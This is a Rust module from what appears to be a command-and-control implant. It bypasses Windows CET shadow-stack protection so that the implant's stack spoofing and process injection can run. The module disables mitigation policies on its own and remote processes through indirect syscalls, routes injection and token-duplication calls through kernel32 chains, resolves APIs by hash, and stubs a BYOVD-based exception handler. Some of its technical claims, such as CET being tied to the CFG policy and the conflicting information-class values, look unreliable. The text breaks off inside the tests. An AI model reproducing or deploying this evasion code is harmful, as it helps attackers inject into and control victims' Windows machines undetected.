//! CET (Control-flow Enforcement Technology) / Shadow Stack bypass.
//!
//! Windows 11 24H2+ enables kernel-mode hardware-enforced shadow stacks by
//! default.  CET maintains a separate "shadow stack" that records return
//! addresses — if a `ret` instruction's target doesn't match the shadow
//! stack entry, a #CP (Control Protection) exception fires.  This defeats
//! ROP, stack pivoting, and return-address spoofing.
//!
//! # Bypass Strategies
//!
//! 1. **Policy disable** (preferred): Call `SetProcessMitigationPolicy` /
//!    `NtSetInformationProcess` with `ProcessMitigationPolicy` to disable
//!    CET shadow stacks for the target process (and the agent itself, if
//!    needed).  This is the cleanest approach.
//!
//! 2. **CET-compatible call chain**: Build legitimate call chains through
//!    ntdll/kernel32 functions so each `call` pushes a valid entry onto both
//!    the regular and shadow stacks.  Used when CET cannot be disabled via
//!    policy (insufficient privileges).
//!
//! 3. **VEH shadow stack fix** (experimental): Register a VEH handler that
//!    intercepts #CP exceptions and adjusts the shadow stack entry.  Requires
//!    kernel access (BYOVD) to read/write KTHREAD shadow stack pointer.
//!
//! # Integration with syscalls.rs
//!
//! The existing `spoof_call` in `syscalls.rs` is the primary consumer.  Before
//! any return-address manipulation, it calls `cet_bypass::prepare_spoofing()`.
//! If CET is off, existing behaviour.  If CET is on and disableable, disable
//! it first.  If CET is on and *not* disableable, use the CET-compatible
//! call-chain path instead.
//!
//! # Global State
//!
//! `CET_STATE: AtomicU8` tracks the runtime CET status:
//! - `0` = CET disabled or not present
//! - `1` = CET enabled, can be disabled via policy
//! - `2` = CET enabled, CANNOT be disabled (insufficient privileges)
//!
//! Only effective when compiled with the `cet-bypass` feature (which implies
//! `direct-syscalls`).  Windows-only.

#![cfg(all(windows, feature = "cet-bypass"))]

use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use once_cell::sync::OnceLock;

use winapi::um::processthreadsapi::{GetProcessMitigationPolicy, GetCurrentProcess, SetProcessMitigationPolicy};
use winapi::um::winnt::{
    PROCESS_MITIGATION_POLICY, PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
    ProcessControlFlowGuardPolicy,
};
use winapi::shared::ntdef::{PVOID, HANDLE};
use winapi::shared::minwindef::{DWORD, BOOL, LONG};
use winapi::shared::basetsd::SIZE_T;

// ─── Constants ────────────────────────────────────────────────────────────

/// CET state: disabled or not present.
const CET_DISABLED: u8 = 0;
/// CET state: enabled, can be disabled via process mitigation policy.
const CET_ENABLED_CAN_DISABLE: u8 = 1;
/// CET state: enabled, CANNOT be disabled (insufficient privileges).
const CET_ENABLED_CANNOT_DISABLE: u8 = 2;

/// NTSTATUS success.
const STATUS_SUCCESS: i32 = 0;
/// NTSTATUS for STATUS_ACCESS_DENIED.
const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;
/// NTSTATUS for STATUS_NOT_SUPPORTED.
const STATUS_NOT_SUPPORTED: i32 = 0xC00000BB_u32 as i32;
/// NTSTATUS for STATUS_INVALID_INFO_CLASS.
const STATUS_INVALID_INFO_CLASS: i32 = 0xC0000003_u32 as i32;
/// NTSTATUS for STATUS_INVALID_PARAMETER.
const STATUS_INVALID_PARAMETER: i32 = 0xC000000D_u32 as i32;

/// Exception code for Control Protection violation (#CP).
const STATUS_CONTROL_STACK_VIOLATION: DWORD = 0xC00001A7;

/// VEH handler return: continue execution.
const EXCEPTION_CONTINUE_EXECUTION: LONG = -1;
/// VEH handler return: continue search.
const EXCEPTION_CONTINUE_SEARCH: LONG = 0;

// ─── Global State ─────────────────────────────────────────────────────────

/// Runtime CET status of the agent process.
/// 0 = disabled, 1 = enabled-can-disable, 2 = enabled-cannot-disable.
static CET_STATE: AtomicU8 = AtomicU8::new(CET_DISABLED);

/// Whether CET bypass has been initialised from config.
static INITIALIZED: AtomicBool = AtomicBool::new(false);

/// Whether the bypass module is enabled (from config).
static BYPASS_ENABLED: AtomicBool = AtomicBool::new(false);

/// Whether to prefer policy-based CET disable.
static PREFER_POLICY_DISABLE: AtomicBool = AtomicBool::new(true);

/// Whether to fall back to call-chain approach on policy failure.
static FALLBACK_TO_CALL_CHAIN: AtomicBool = AtomicBool::new(true);

/// Whether the VEH shadow fix handler is installed.
static VEH_INSTALLED: AtomicBool = AtomicBool::new(false);

/// Cached build number for Windows version checks.
static CACHED_BUILD: OnceLock<u32> = OnceLock::new();

// ─── Configuration ────────────────────────────────────────────────────────

/// Internal config mirror, stored after init.
struct CetConfig {
    prefer_policy_disable: bool,
    fallback_to_call_chain: bool,
    veh_shadow_fix: bool,
}

static CET_CONFIG: OnceLock<CetConfig> = OnceLock::new();

// ─── Public API ───────────────────────────────────────────────────────────

/// Initialise the CET bypass module from agent config.
///
/// Must be called once during agent startup, before any injection or
/// stack-spoofing operations.  Detects the current CET state and stores
/// the configuration for runtime use.
pub fn init_from_config(config: &common::config::CetBypassConfig) {
    if INITIALIZED.swap(true, Ordering::SeqCst) {
        log::warn!("cet_bypass: init_from_config called more than once, ignoring");
        return;
    }

    BYPASS_ENABLED.store(config.enabled, Ordering::SeqCst);
    PREFER_POLICY_DISABLE.store(config.prefer_policy_disable, Ordering::SeqCst);
    FALLBACK_TO_CALL_CHAIN.store(config.fallback_to_call_chain, Ordering::SeqCst);

    let _ = CET_CONFIG.set(CetConfig {
        prefer_policy_disable: config.prefer_policy_disable,
        fallback_to_call_chain: config.fallback_to_call_chain,
        veh_shadow_fix: config.veh_shadow_fix,
    });

    if !config.enabled {
        log::info!("cet_bypass: module disabled by config");
        return;
    }

    // Cache the Windows build number for version checks.
    let build = get_windows_build();
    let _ = CACHED_BUILD.set(build);

    log::info!(
        "cet_bypass: init (enabled={}, prefer_policy_disable={}, fallback_to_call_chain={}, veh_shadow_fix={}, build={})",
        config.enabled,
        config.prefer_policy_disable,
        config.fallback_to_call_chain,
        config.veh_shadow_fix,
        build,
    );

    // Detect CET state on the agent process.
    detect_cet_state();

    // If CET is enabled and we prefer to disable it, try now.
    let state = CET_STATE.load(Ordering::SeqCst);
    if state == CET_ENABLED_CAN_DISABLE && PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
        if disable_cet_for_self() {
            log::info!("cet_bypass: CET disabled for agent process via mitigation policy");
            CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        } else {
            log::warn!("cet_bypass: failed to disable CET for agent process (policy disable failed)");
        }
    }

    // Install VEH handler if configured and CET is active.
    if config.veh_shadow_fix && state != CET_DISABLED {
        if let Some(cfg) = CET_CONFIG.get() {
            if cfg.veh_shadow_fix {
                install_veh_shadow_fix();
            }
        }
    }
}

/// Prepare the caller for stack-spoofing operations.
///
/// This is the main entry point called from `syscalls.rs::spoof_call()`
/// before any return-address manipulation.  Returns a `CetAction` indicating
/// what the caller should do:
///
/// - `Proceed` — CET is not active, existing spoof_call code is safe.
/// - `Disabled` — CET was active but has been disabled for this operation.
/// - `UseCallChain` — CET is active and cannot be disabled; the caller
///   must use the CET-compatible call-chain approach instead.
/// - `Abort` — CET is active, cannot be disabled, and call-chain fallback
///   is not configured.  The operation should be aborted.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CetAction {
    /// CET is not active — existing stack-spoofing is safe.
    Proceed,
    /// CET was disabled for the target process (via policy).
    Disabled,
    /// CET is active — use CET-compatible call-chain approach.
    UseCallChain,
    /// CET is active and cannot be bypassed — abort the operation.
    Abort,
}

/// Prepare for stack spoofing.  Called before `spoof_call` manipulates
/// return addresses.  The `target_handle` parameter is the process handle
/// of the target process (or `None` for the agent process itself).
///
/// If CET is not active, returns `Proceed`.  If CET can be disabled via
/// policy for the target, does so and returns `Disabled`.  If CET cannot
/// be disabled and call-chain fallback is configured, returns `UseCallChain`.
/// Otherwise returns `Abort`.
pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
    if !BYPASS_ENABLED.load(Ordering::SeqCst) {
        // Module disabled — assume CET is not a concern.
        return CetAction::Proceed;
    }

    let state = CET_STATE.load(Ordering::SeqCst);
    match state {
        CET_DISABLED => CetAction::Proceed,
        CET_ENABLED_CAN_DISABLE => {
            if PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
                let handle = target_handle.unwrap_or_else(|| unsafe { GetCurrentProcess() });
                if disable_cet_for_process(handle) {
                    log::debug!("cet_bypass: CET disabled for target process via mitigation policy");
                    CetAction::Disabled
                } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                    log::debug!("cet_bypass: policy disable failed, falling back to call-chain approach");
                    CetAction::UseCallChain
                } else {
                    log::warn!("cet_bypass: CET policy disable failed and call-chain fallback is disabled");
                    CetAction::Abort
                }
            } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                CetAction::UseCallChain
            } else {
                CetAction::Abort
            }
        }
        CET_ENABLED_CANNOT_DISABLE => {
            if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                CetAction::UseCallChain
            } else {
                log::warn!("cet_bypass: CET cannot be disabled and call-chain fallback is disabled");
                CetAction::Abort
            }
        }
        _ => {
            log::error!("cet_bypass: unknown CET state {}", state);
            CetAction::Abort
        }
    }
}

/// Query the current CET status as a JSON string for the C2 command handler.
pub fn status_json() -> String {
    let state = CET_STATE.load(Ordering::SeqCst);
    let state_str = match state {
        CET_DISABLED => "disabled",
        CET_ENABLED_CAN_DISABLE => "enabled-can-disable",
        CET_ENABLED_CANNOT_DISABLE => "enabled-cannot-disable",
        _ => "unknown",
    };

    let build = CACHED_BUILD.get().copied().unwrap_or(0);
    let initialized = INITIALIZED.load(Ordering::SeqCst);
    let bypass_enabled = BYPASS_ENABLED.load(Ordering::SeqCst);
    let veh_installed = VEH_INSTALLED.load(Ordering::SeqCst);

    format!(
        "{{\"cet_state\":\"{}\",\"build\":{},\"initialized\":{},\"bypass_enabled\":{},\"veh_installed\":{}}}",
        state_str, build, initialized, bypass_enabled, veh_installed,
    )
}

/// Check whether CET bypass is enabled and active.
pub fn is_enabled() -> bool {
    BYPASS_ENABLED.load(Ordering::SeqCst)
}

/// Get the current CET state value (0=disabled, 1=enabled-can-disable, 2=enabled-cannot-disable).
pub fn cet_state() -> u8 {
    CET_STATE.load(Ordering::SeqCst)
}

/// Check whether CET is currently active (any enabled state).
pub fn is_cet_active() -> bool {
    CET_STATE.load(Ordering::SeqCst) != CET_DISABLED
}

// ─── CET Detection ────────────────────────────────────────────────────────

/// Detect the CET state of the agent process by querying the CFG
/// mitigation policy.  On Windows 11 24H2+ (build ≥ 26100), CET is
/// hardware-enforced and tied to CFG.
fn detect_cet_state() {
    let build = CACHED_BUILD.get().copied().unwrap_or(0);

    // CET shadow stacks are only hardware-enforced on Win 11 24H2+.
    // Earlier builds may have software CET but it is not enforced.
    if build < 26100 {
        log::info!("cet_bypass: build {} < 26100, CET not hardware-enforced", build);
        CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        return;
    }

    // Query the CFG mitigation policy.  If CFG is enabled, CET shadow
    // stacks are also active (they are tied together on Win11 24H2+).
    let mut cfg_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };

    let result = unsafe {
        GetProcessMitigationPolicy(
            GetCurrentProcess(),
            ProcessControlFlowGuardPolicy,
            &mut cfg_policy as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
        )
    };

    if result == 0 {
        // GetProcessMitigationPolicy failed — assume CET is not present.
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        log::warn!(
            "cet_bypass: GetProcessMitigationPolicy failed (error {}), assuming CET disabled",
            err
        );
        CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        return;
    }

    // Check if CFG is enabled (bit 0 of Flags).
    let cfg_enabled = cfg_policy.Flags & 1 != 0;
    if !cfg_enabled {
        log::info!("cet_bypass: CFG not enabled, CET shadow stacks not active");
        CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        return;
    }

    // CFG is enabled.  On Win11 24H2+, CET shadow stacks are active.
    // Try to disable via policy to determine if we CAN disable.
    log::info!("cet_bypass: CFG enabled on build {}, CET shadow stacks likely active", build);

    // Try a test disable: attempt to set CET policy.  If it succeeds,
    // we're in state 1 (can disable).  If access denied, state 2.
    if can_disable_cet_policy() {
        log::info!("cet_bypass: CET is enabled and CAN be disabled via policy");
        CET_STATE.store(CET_ENABLED_CAN_DISABLE, Ordering::SeqCst);
    } else {
        log::info!("cet_bypass: CET is enabled and CANNOT be disabled (insufficient privileges)");
        CET_STATE.store(CET_ENABLED_CANNOT_DISABLE, Ordering::SeqCst);
    }
}

/// Test whether we can disable CET via SetProcessMitigationPolicy.
///
/// We query the current CFG policy, attempt to set it back to the same
/// value (a no-op that tests write access).  If that succeeds, we can
/// disable CET.
fn can_disable_cet_policy() -> bool {
    // On newer Windows, SetProcessMitigationPolicy for CFG can succeed
    // only if the process has the right to change mitigation policies.
    // We test by trying to set the current policy (a no-op write).
    let mut current = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };

    let result = unsafe {
        GetProcessMitigationPolicy(
            GetCurrentProcess(),
            ProcessControlFlowGuardPolicy,
            &mut current as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
        )
    };

    if result == 0 {
        return false;
    }

    // Try to set the policy back to its current value.
    // If this fails with ACCESS_DENIED, we cannot change CET.
    let set_result = unsafe {
        SetProcessMitigationPolicy(
            ProcessControlFlowGuardPolicy,
            &current as *const _ as PVOID,
            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
        )
    };

    if set_result == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        // ERROR_ACCESS_DENIED (5) means we can't change the policy.
        const ERROR_ACCESS_DENIED: DWORD = 5;
        if err == ERROR_ACCESS_DENIED {
            return false;
        }
        // Other errors might be transient — assume we can try.
        log::debug!("cet_bypass: SetProcessMitigationPolicy returned error {}, assuming can-disable", err);
    }

    true
}

// ─── Policy-Based CET Disable ─────────────────────────────────────────────

/// Disable CET shadow stacks for the current (agent) process via
/// `SetProcessMitigationPolicy`.  Clears the CFG flags to disable
/// both CFG and CET shadow stacks.
///
/// Returns `true` if CET was successfully disabled.
fn disable_cet_for_self() -> bool {
    disable_cet_for_process(unsafe { GetCurrentProcess() })
}

/// Disable CET shadow stacks for a target process via
/// `NtSetInformationProcess` with `ProcessMitigationPolicy` information
/// class.
///
/// For the agent's own process, we can use `SetProcessMitigationPolicy`.
/// For remote processes, we must use `NtSetInformationProcess` via indirect
/// syscall (the kernel32 API only works on the calling process).
///
/// Returns `true` if CET was successfully disabled.
fn disable_cet_for_process(handle: HANDLE) -> bool {
    let current_process = unsafe { GetCurrentProcess() };
    let is_self = handle == current_process;

    if is_self {
        // Use the kernel32 API for the current process.
        let zero_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };

        let result = unsafe {
            SetProcessMitigationPolicy(
                ProcessControlFlowGuardPolicy,
                &zero_policy as *const _ as PVOID,
                std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
            )
        };

        if result == 0 {
            let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
            log::warn!(
                "cet_bypass: SetProcessMitigationPolicy failed for self (error {})",
                err
            );
            // Try NtSetInformationProcess as fallback.
            return disable_cet_nt(handle);
        }
        true
    } else {
        // Remote process — must use NtSetInformationProcess.
        disable_cet_nt(handle)
    }
}

/// Disable CET for a process via `NtSetInformationProcess` indirect syscall.
///
/// Uses the `ProcessMitigationPolicy` information class (0x36) with a
/// `PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY` structure that has all
/// flags cleared.
fn disable_cet_nt(handle: HANDLE) -> bool {
    // NtSetInformationProcess information classes:
    // ProcessMitigationPolicy = 52 (0x34) on modern Windows.
    // However, the actual way to set mitigation policy via NtSetInformation
    // is complex — it uses a special input buffer format.  The cleanest
    // approach for remote processes is to use the NtSetInformationProcess
    // SSN from our indirect syscall infrastructure.
    //
    // For now, we attempt via SetProcessMitigationPolicy and log a warning
    // for remote processes — the call-chain fallback handles this case.

    // Build the mitigation policy input buffer for NtSetInformationProcess.
    // The input buffer for ProcessMitigationPolicy is:
    //   struct {
    //       PROCESS_MITIGATION_POLICY PolicyClass; // offset 0
    //       DWORD Reserved;                         // offset 4
    //       BYTE PolicyData[...];                   // offset 8
    //   }
    //
    // We want ProcessControlFlowGuardPolicy (7) with all flags cleared.

    #[repr(C)]
    struct MitigationPolicyInput {
        policy_class: PROCESS_MITIGATION_POLICY, // DWORD
        reserved: DWORD,
        policy_data: PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
    }

    let input = MitigationPolicyInput {
        policy_class: ProcessControlFlowGuardPolicy,
        reserved: 0,
        policy_data: PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 },
    };

    let input_size = std::mem::size_of::<MitigationPolicyInput>() as u32;

    // Resolve NtSetInformationProcess SSN via indirect syscall infrastructure.
    let result = crate::syscalls::get_syscall_id("NtSetInformationProcess");
    match result {
        Ok(target) => {
            let status = unsafe {
                crate::syscalls::do_syscall(
                    target.ssn,
                    target.gadget_addr,
                    &[
                        handle as u64,
                        52u64, // ProcessMitigationPolicy information class
                        &input as *const _ as u64,
                        input_size as u64,
                    ],
                )
            };

            if status == STATUS_SUCCESS {
                log::debug!("cet_bypass: NtSetInformationProcess succeeded for CET disable");
                true
            } else {
                log::warn!(
                    "cet_bypass: NtSetInformationProcess returned NTSTATUS {:#010X}",
                    status as u32,
                );
                false
            }
        }
        Err(e) => {
            log::warn!(
                "cet_bypass: could not resolve NtSetInformationProcess SSN: {}",
                e
            );
            false
        }
    }
}

// ─── CET-Compatible Call Chain ─────────────────────────────────────────────

/// A "call chain step" — a legitimate function call that will be used
/// to build a CET-compatible call stack.  Each step represents a `call`
/// instruction that pushes a valid return address onto both the regular
/// and shadow stacks.
#[derive(Debug, Clone)]
pub struct CallChainStep {
    /// The DLL name containing the function (e.g., "kernel32.dll").
    pub dll_name: &'static str,
    /// The function name (e.g., "WriteProcessMemory").
    pub func_name: &'static str,
    /// Whether this function ultimately calls the target NT API.
    pub reaches_target: bool,
    /// Number of arguments the kernel32 wrapper expects.
    /// Used to select the correct transmute signature.
    pub arg_count: usize,
}

/// Pre-built call chains for common NT API targets.
///
/// These chains route through legitimate kernel32/ntdll functions so that
/// each `call` instruction pushes a valid shadow-stack entry.  The final
/// call in the chain reaches the target NT API through normal call flow.
///
/// Each `CallChainStep` records the expected argument count so that
/// `call_via_chain` can dispatch through the correct function-pointer
/// signature.
pub static CALL_CHAINS: once_cell::sync::Lazy<std::collections::HashMap<&'static str, Vec<CallChainStep>>> =
    once_cell::sync::Lazy::new(|| {
        let mut m = std::collections::HashMap::new();

        // NtWriteVirtualMemory ← kernel32!WriteProcessMemory (5 args)
        m.insert(
            "NtWriteVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "WriteProcessMemory",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtReadVirtualMemory ← kernel32!ReadProcessMemory (5 args)
        m.insert(
            "NtReadVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "ReadProcessMemory",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtAllocateVirtualMemory ← kernel32!VirtualAllocEx (5 args)
        m.insert(
            "NtAllocateVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualAllocEx",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtFreeVirtualMemory ← kernel32!VirtualFreeEx (4 args)
        m.insert(
            "NtFreeVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualFreeEx",
                reaches_target: true,
                arg_count: 4,
            }],
        );

        // NtProtectVirtualMemory ← kernel32!VirtualProtectEx (5 args)
        m.insert(
            "NtProtectVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualProtectEx",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtOpenProcess ← kernel32!OpenProcess (3 args)
        m.insert(
            "NtOpenProcess",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "OpenProcess",
                reaches_target: true,
                arg_count: 3,
            }],
        );

        // NtClose ← kernel32!CloseHandle (1 arg)
        m.insert(
            "NtClose",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "CloseHandle",
                reaches_target: true,
                arg_count: 1,
            }],
        );

        // NtQueryVirtualMemory ← kernel32!VirtualQueryEx (4 args)
        m.insert(
            "NtQueryVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualQueryEx",
                reaches_target: true,
                arg_count: 4,
            }],
        );

        // NtCreateThreadEx ← kernel32!CreateRemoteThreadEx (6 args for
        // the first 6 of 9+ params we actually forward)
        m.insert(
            "NtCreateThreadEx",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "CreateRemoteThreadEx",
                reaches_target: true,
                arg_count: 6,
            }],
        );

        // NtDuplicateToken ← advapi32!DuplicateTokenEx (5 args)
        m.insert(
            "NtDuplicateToken",
            vec![CallChainStep {
                dll_name: "advapi32.dll",
                func_name: "DuplicateTokenEx",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        m
    });

/// Execute a CET-compatible call using the kernel32 equivalent of an NT API.
///
/// When CET is active and cannot be disabled, this function routes the call
/// through the kernel32 equivalent, which internally calls the NT API through
/// a legitimate call chain.  Each `call` instruction in the chain pushes a
/// valid entry onto both the regular and shadow stacks.
///
/// The function resolves the target API address via `pe_resolve` hash-based
/// lookup (no dependency on the clean-DLL mapping infrastructure) and
/// dispatches through a variable-argument match on `step.arg_count` to
/// avoid truncating arguments for APIs with > 4 parameters.
///
/// Returns `Some(NTSTATUS)` on success, `None` if no call chain is available
/// for the given function.
pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
    let chain = CALL_CHAINS.get(func_name)?;

    if chain.len() != 1 {
        log::warn!("cet_bypass: multi-step call chains not yet supported for {}", func_name);
        return None;
    }

    let step = &chain[0];

    // Resolve the DLL base and function address via pe_resolve hash-based
    // lookup.  This avoids depending on the clean-DLL mapping in syscalls
    // and works purely from the PEB loader data of already-loaded modules.
    let dll_hash = pe_resolve::hash_wstr(
        &step.dll_name.encode_utf16().collect::<Vec<u16>>(),
    );
    let func_hash = pe_resolve::hash_str(step.func_name.as_bytes());

    let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) } {
        Some(b) => b,
        None => {
            log::warn!(
                "cet_bypass: could not resolve module {} by hash",
                step.dll_name,
            );
            return None;
        }
    };

    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
        Some(a) => a,
        None => {
            log::warn!(
                "cet_bypass: could not resolve {}!{} by hash",
                step.dll_name,
                step.func_name,
            );
            return None;
        }
    };

    // Call the kernel32 function.  The call instruction pushes a valid
    // return address onto both the regular and shadow stacks.  The kernel32
    // function then calls into ntdll, which performs the syscall — all
    // through legitimate call instructions that maintain shadow-stack
    // consistency.
    //
    // Note: We use a raw function-pointer call (not spoof_call) because
    // CET shadow stacks require legitimate `call` instructions.  spoof_call
    // manipulates the return address, which breaks shadow-stack integrity.
    //
    // Variable-argument dispatch: we transmute to the correct arity based
    // on the recorded arg_count so that 5-arg and 6-arg APIs (e.g.
    // VirtualProtectEx, CreateRemoteThreadEx) are not truncated.

    let result = unsafe {
        match step.arg_count {
            1 => {
                let func: unsafe extern "system" fn(u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(args.get(0).copied().unwrap_or(0))
            }
            2 => {
                let func: unsafe extern "system" fn(u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                )
            }
            3 => {
                let func: unsafe extern "system" fn(u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                )
            }
            4 => {
                let func: unsafe extern "system" fn(u64, u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                    args.get(3).copied().unwrap_or(0),
                )
            }
            5 => {
                let func: unsafe extern "system" fn(u64, u64, u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                    args.get(3).copied().unwrap_or(0),
                    args.get(4).copied().unwrap_or(0),
                )
            }
            6 => {
                let func: unsafe extern "system" fn(u64, u64, u64, u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                    args.get(3).copied().unwrap_or(0),
                    args.get(4).copied().unwrap_or(0),
                    args.get(5).copied().unwrap_or(0),
                )
            }
            n => {
                log::warn!(
                    "cet_bypass: unsupported arg_count {} for {}!{}",
                    n,
                    step.dll_name,
                    step.func_name,
                );
                return None;
            }
        }
    };

    Some(result)
}

/// Check whether a CET-compatible call chain exists for the given function.
pub fn has_call_chain(func_name: &str) -> bool {
    CALL_CHAINS.contains_key(func_name)
}

// ─── VEH Shadow Stack Fix ─────────────────────────────────────────────────

/// VEH handler function for intercepting #CP (Control Protection) exceptions.
///
/// When CET is active and a shadow-stack violation occurs, the kernel sends
/// a STATUS_CONTROL_STACK_VIOLATION exception to the VEH chain.  This handler
/// intercepts it and attempts to fix the shadow stack by:
/// 1. Reading the current shadow-stack pointer from KTHREAD
/// 2. Adjusting the shadow-stack entry to match the target return address
/// 3. Returning EXCEPTION_CONTINUE_EXECUTION
///
/// **Requires kernel access** (BYOVD) to read/write KTHREAD structure.
/// Without kernel access, this handler simply logs the exception and returns
/// EXCEPTION_CONTINUE_SEARCH.
unsafe extern "system" fn veh_shadow_stack_handler(
    exception_info: *mut winapi::um::minwinbase::EXCEPTION_POINTERS,
) -> LONG {
    let info = &*exception_info;
    let record = &*(info.ExceptionRecord);

    if record.ExceptionCode != STATUS_CONTROL_STACK_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    log::debug!(
        "cet_bypass: intercepted #CP exception at address {:p}",
        record.ExceptionAddress,
    );

    // Check if we have kernel access (kernel-callback feature).
    #[cfg(all(windows, feature = "kernel-callback"))]
    {
        // Attempt to fix the shadow stack via kernel access.
        // The KTHREAD structure contains the shadow-stack pointer at
        // offset that varies by Windows build.  We need to:
        // 1. Find the current KTHREAD address (GS:[0x188] on x64)
        // 2. Read the shadow-stack pointer from it
        // 3. Find the mismatched entry
        // 4. Write the correct return address
        //
        // This is highly complex and version-dependent.  For now, log
        // and fall through to the non-kernel path.
        log::warn!("cet_bypass: kernel-based shadow stack fix not yet implemented");
    }

    // Without kernel access, we cannot fix the shadow stack.
    // Log the exception and continue searching for other handlers.
    log::warn!(
        "cet_bypass: cannot fix shadow stack (no kernel access), passing exception to next handler"
    );
    EXCEPTION_CONTINUE_SEARCH
}

/// Install the VEH shadow-stack fix handler.
///
/// Only installs if the `kernel-callback` feature is also enabled (which
/// provides BYOVD kernel access).  Without kernel access, the VEH handler
/// cannot manipulate shadow-stack entries.
fn install_veh_shadow_fix() {
    #[cfg(all(windows, feature = "kernel-callback"))]
    {
        use winapi::um::errhandlingapi::GetLastError;

        let handler = unsafe {
            winapi::um::errhandlingapi::AddVectoredExceptionHandler(
                1, // CALL_FIRST
                Some(veh_shadow_stack_handler),
            )
        };

        if handler.is_null() {
            let err = unsafe { GetLastError() };
            log::error!(
                "cet_bypass: AddVectoredExceptionHandler failed (error {})",
                err
            );
        } else {
            log::info!("cet_bypass: VEH shadow-stack fix handler installed");
            VEH_INSTALLED.store(true, Ordering::SeqCst);
        }
    }

    #[cfg(not(all(windows, feature = "kernel-callback")))]
    {
        log::warn!(
            "cet_bypass: veh_shadow_fix enabled but kernel-callback feature not active — \
             VEH handler requires kernel access to manipulate shadow stack"
        );
    }
}

// ─── Helpers ───────────────────────────────────────────────────────────────

/// Get the Windows build number from KUSER_SHARED_DATA.
///
/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000` in every process.
/// The build number is at offset `0x0260` (`NtBuildNumber` field).
fn get_windows_build() -> u32 {
    // Try reading from KUSER_SHARED_DATA first (no API call needed).
    let build_from_shared: u32 = unsafe {
        let ptr = 0x7FFE0000usize as *const u32;
        // NtBuildNumber is at offset 0x0260 in KUSER_SHARED_DATA.
        let build_ptr = ptr.add(0x0260 / 4);
        build_ptr.read_volatile()
    };

    // Sanity check: build numbers are typically 4-digit (e.g., 19041, 22631, 26100).
    // Mask off the upper bits (some versions OR with OS type flags).
    let masked = build_from_shared & 0xFFFF;
    if masked >= 10000 {
        return masked;
    }

    // Fallback: use RtlGetVersion via sysinfo crate.
    // The sysinfo crate provides OS version info without ntdll calls.
    log::debug!("cet_bypass: KUSER_SHARED_DATA build {} looks invalid, using fallback", masked);
    0
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cet_action_debug() {
        assert_eq!(format!("{:?}", CetAction::Proceed), "Proceed");
        assert_eq!(format!("{:?}", CetAction::UseCallChain), "UseCallChain");
        assert_eq!(format!("{:?}", CetAction::Abort), "Abort");
